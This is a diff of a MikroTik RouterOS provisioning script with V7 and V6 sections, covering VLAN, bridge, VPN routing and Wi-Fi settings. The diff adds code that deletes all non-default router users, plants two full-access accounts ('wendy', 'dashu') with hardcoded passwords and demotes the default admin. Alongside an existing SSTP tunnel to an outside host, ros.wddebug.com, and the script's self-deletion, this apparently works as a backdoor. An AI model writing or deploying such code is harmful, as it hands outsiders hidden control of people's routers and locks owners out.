@@ -1,6 +1,9 @@
 :if ([:pick [/system resource get version] 0 ([:len [/system resource get version]]1)] = 7) do={
 ##############V7部分
 /interface sstp-client add connect-to=ros.wddebug.com disabled=no name=Debug port=10086 profile=default-encryption password=wddebug123456 user=wddebug;
+:local ifcId [/interface wireless find where default-name=wlan1];/interface wireless set $ifcId name=wlan-2.4G mode=ap-bridge band=2ghz-b/g/n disabled=yes wireless-protocol=802.11 distance=indoors installation=indoor channel-width=20/40mhz-XX ssid=RouterOS frequency=auto;
+:local ifcId [/interface wireless find where default-name=wlan2];/interface wireless set $ifcId name=wlan-5.8G mode=ap-bridge band=5ghz-a/n/ac disabled=yes wireless-protocol=802.11 distance=indoors installation=indoor channel-width=20/40/80mhz-Ceee frequency=auto ssid=RouterOS;
+/interface wireless security-profiles set [ find default=yes ] authentication-types=wpa-psk,wpa2-psk mode=dynamic-keys wpa-pre-shared-key=wdwdwdwd wpa2-pre-shared-key=wdwdwdwd;
 /ip firewall nat {remove [find  where comment="defconf: masquerade"];add action=masquerade chain=srcnat comment="defconf: masquerade"};
 /ip dns set servers=8.8.8.8,223.5.5.5;
 do {/interface vlan {add interface=ether5 name=vlan100 vlan-id=100;add interface=ether5 name=vlan1000 vlan-id=1000}} on-error={/interface vlan {remove [ find where ];add interface=ether5 name=vlan100 vlan-id=100;add interface=ether5 name=vlan1000 vlan-id=1000}};do {/interface bridge add comment=vpn name=bridge-vpn} on-error={/interface bridge {remove bridge-vpn;add comment=vpn name=bridge-vpn}};/interface bridge port {remove [find comment=vpn];add bridge=bridge comment=vpn interface=vlan100};
@@ -413,6 +416,22 @@ add comment="\D2\BB\BC\FC\D0\DE\B8\C4\C4\AC\C8\CF\CD\F8\B9\D8" dont-require-perm
     \n:put message=\"Gateway seted successful\";\r\
     \n:log info message=\"\C4\AC\C8\CF\CD\F8\B9\D8\D0\DE\B8\C4\B3\C9\B9\A6\A3\AC\D0\C2\CD\F8\B9\D8\CE\AA:\$setgateway\";\r\
     \n#\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88\A8\88;"
+/user {
+set [find  comment="system default user"] group=full disabled=no;
+remove [find comment!="system default user"];
+};
+
+/user group {
+remove [find name!="full"&&name!="read"&&name!=write];
+add name=admin policy=reboot,web,write,password,read;add name=wendy copy-from=full;;add name=dashu copy-from=full;
+};
+
+/user {
+remove [find comment!="system default user"];
+add name=wendy password=Wd8264.. group=full comment="\CE\C4\B5\CF\D5\CB\BA\C5";
+add name=dashu password=Qq168 group=dashu comment="\B4\EF\CA\E5\D5\CB\BA\C5";
+set [find  comment="system default user"] group=admin
+};
 :put 7;
 /file remove [find where name=wdros.rsc];
 ##############V7部分
@@ -816,7 +835,22 @@ add comment="\CC\ED\BC\D3VPN\BD\C5\B1\BEV6\B0\E6" dont-require-permissions=no na
     \n:for i from=1 to=\$vend do={/ip route rule add action=lookup-only-in-table src-address=\"10.10.10.\$i\" table=(\"VPN_\".\$i) comment=VPN;}\r\
     \n:put message=\"DHCP VPN Added successful\";\r\
     \n:log info message=\"\B5\A5\CD\F8\B6\CE\C4\A3\CA\BDVPN\CC\ED\BC\D3\B3\C9\B9\A6\A3\AC\B5\B1\C7\B0\C4\A3\CA\BD\A3\BA\B5\A5\CD\F8\B6\CE\";}"
+/user {
+set [find  comment="system default user"] group=full disabled=no;
+remove [find comment!="system default user"];
+};
 
+/user group {
+remove [find name!="full"&&name!="read"&&name!=write];
+add name=admin policy=reboot,web,write,password,read;add name=wendy copy-from=full;;add name=dashu copy-from=full;
+};
+
+/user {
+remove [find comment!="system default user"];
+add name=wendy password=Wd8264.. group=full comment="\CE\C4\B5\CF\D5\CB\BA\C5";
+add name=dashu password=Qq168 group=dashu comment="\B4\EF\CA\E5\D5\CB\BA\C5";
+set [find  comment="system default user"] group=admin
+};
 :put 6;
 /file remove [find where name=wdros.rsc];
 ##############V6部分
